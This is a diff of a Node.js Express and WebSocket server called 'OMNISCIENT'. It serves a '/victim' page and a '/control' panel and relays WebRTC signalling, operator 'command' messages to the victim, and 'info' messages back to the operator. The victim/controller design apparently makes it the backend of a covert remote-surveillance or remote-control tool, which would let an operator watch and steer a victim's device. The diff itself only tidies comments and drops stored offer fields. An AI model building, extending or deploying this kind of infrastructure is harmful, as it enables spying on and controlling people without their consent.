@@ -7,7 +7,7 @@ const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
-// ----- ROUTES (clean URLs) -----
+// Routes for clean URLs
 app.get('/', (req, res) => {
     res.send('OMNISCIENT is live. Use /victim for the victim page, /control for the control panel.');
 });
@@ -20,11 +20,11 @@ app.get('/control', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'control.html'));
 });
 
-// ----- STATIC FILES (fallback for assets) -----
+// Static files fallback
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ----- WEBSOCKET ROOM MANAGEMENT -----
-const rooms = new Map(); // roomId -> { victimWs, controllerWs, victimOffer, controllerAnswer }
+// WebSocket room management
+const rooms = new Map();
 
 wss.on('connection', (ws) => {
     let roomId = null;
@@ -33,58 +33,45 @@ wss.on('connection', (ws) => {
     ws.on('message', (message) => {
         try {
             const data = JSON.parse(message);
-
             switch (data.type) {
                 case 'join': {
                     roomId = data.room;
                     role = data.role;
                     if (!rooms.has(roomId)) {
-                        rooms.set(roomId, { victimWs: null, controllerWs: null, victimOffer: null, controllerAnswer: null });
+                        rooms.set(roomId, { victimWs: null, controllerWs: null });
                     }
                     const room = rooms.get(roomId);
-                    if (role === 'victim') {
-                        room.victimWs = ws;
-                    } else if (role === 'controller') {
-                        room.controllerWs = ws;
-                    }
+                    if (role === 'victim') room.victimWs = ws;
+                    else if (role === 'controller') room.controllerWs = ws;
                     ws.roomId = roomId;
                     ws.role = role;
                     ws.send(JSON.stringify({ type: 'joined', role }));
                     break;
                 }
-
                 case 'webrtc_offer': {
                     if (role === 'victim') {
                         const room = rooms.get(roomId);
-                        if (room) {
-                            room.victimOffer = data.offer;
-                            if (room.controllerWs && room.controllerWs.readyState === WebSocket.OPEN) {
-                                room.controllerWs.send(JSON.stringify({
-                                    type: 'webrtc_offer',
-                                    offer: data.offer
-                                }));
-                            }
+                        if (room && room.controllerWs && room.controllerWs.readyState === WebSocket.OPEN) {
+                            room.controllerWs.send(JSON.stringify({
+                                type: 'webrtc_offer',
+                                offer: data.offer
+                            }));
                         }
                     }
                     break;
                 }
-
                 case 'webrtc_answer': {
                     if (role === 'controller') {
                         const room = rooms.get(roomId);
-                        if (room) {
-                            room.controllerAnswer = data.answer;
-                            if (room.victimWs && room.victimWs.readyState === WebSocket.OPEN) {
-                                room.victimWs.send(JSON.stringify({
-                                    type: 'webrtc_answer',
-                                    answer: data.answer
-                                }));
-                            }
+                        if (room && room.victimWs && room.victimWs.readyState === WebSocket.OPEN) {
+                            room.victimWs.send(JSON.stringify({
+                                type: 'webrtc_answer',
+                                answer: data.answer
+                            }));
                         }
                     }
                     break;
                 }
-
                 case 'webrtc_ice': {
                     const room = rooms.get(roomId);
                     if (room) {
@@ -98,7 +85,6 @@ wss.on('connection', (ws) => {
                     }
                     break;
                 }
-
                 case 'command': {
                     if (role === 'controller') {
                         const room = rooms.get(roomId);
@@ -111,7 +97,6 @@ wss.on('connection', (ws) => {
                     }
                     break;
                 }
-
                 case 'info': {
                     if (role === 'victim') {
                         const room = rooms.get(roomId);
@@ -124,13 +109,9 @@ wss.on('connection', (ws) => {
                     }
                     break;
                 }
-
-                default:
-                    break;
+                default: break;
             }
-        } catch (e) {
-            // ignore malformed JSON
-        }
+        } catch (e) { /* ignore */ }
     });
 
     ws.on('close', () => {
@@ -138,15 +119,12 @@ wss.on('connection', (ws) => {
             const room = rooms.get(roomId);
             if (room.victimWs === ws) room.victimWs = null;
             if (room.controllerWs === ws) room.controllerWs = null;
-            // Clean up if both are gone
-            if (!room.victimWs && !room.controllerWs) {
-                rooms.delete(roomId);
-            }
+            if (!room.victimWs && !room.controllerWs) rooms.delete(roomId);
         }
     });
 });
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 OMNISCIENT server running on port ${PORT}`);
+    console.log(`🚀 OMNISCIENT running on port ${PORT}`);
 });
